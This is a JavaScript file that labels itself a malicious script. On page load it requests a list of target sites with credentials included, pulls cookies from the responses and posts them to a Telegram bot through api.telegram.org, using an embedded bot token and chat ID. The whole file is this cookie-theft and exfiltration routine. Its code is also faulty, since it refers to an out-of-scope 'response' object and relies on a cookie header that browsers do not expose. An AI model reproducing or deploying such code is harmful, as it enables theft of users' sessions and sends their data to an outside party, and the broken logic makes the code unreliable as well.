document.addEventListener('DOMContentLoaded', () => {
    console.log('Malicious script loaded!');

    // List of target websites to steal cookies from
    const targetWebsites = [
        "https://example.com",
        "https://anotherexample.com"
    ];

    // Telegram bot details
    const botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjceyobE";
    const chatId = "899184398";

    // Function to steal cookies from a target website
    function stealCookies(url) {
        fetch(url, {
            method: 'GET',
            credentials: 'include' // Include cookies in the request
        })
        .then(response => response.text())
        .then(data => {
            // Extract cookies from the response headers
            const cookies = response.headers.get('set-cookie') || 'No cookies found';
            console.log(`Cookies stolen from ${url}:`, cookies);

            // Send stolen cookies to Telegram
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const message = `Stolen Cookies from ${url}: ${cookies}`;

            fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => {
                if (response.ok) {
                    console.log(`Cookies from ${url} sent to Telegram!`);
                } else {
                    console.error(`Failed to send cookies from ${url}.`);
                }
            })
            .catch(error => {
                console.error(`Error sending cookies from ${url}:`, error);
            });
        })
        .catch(error => {
            console.error(`Error stealing cookies from ${url}:`, error);
        });
    }

    // Attempt to steal cookies from each target website
    targetWebsites.forEach(stealCookies);
});
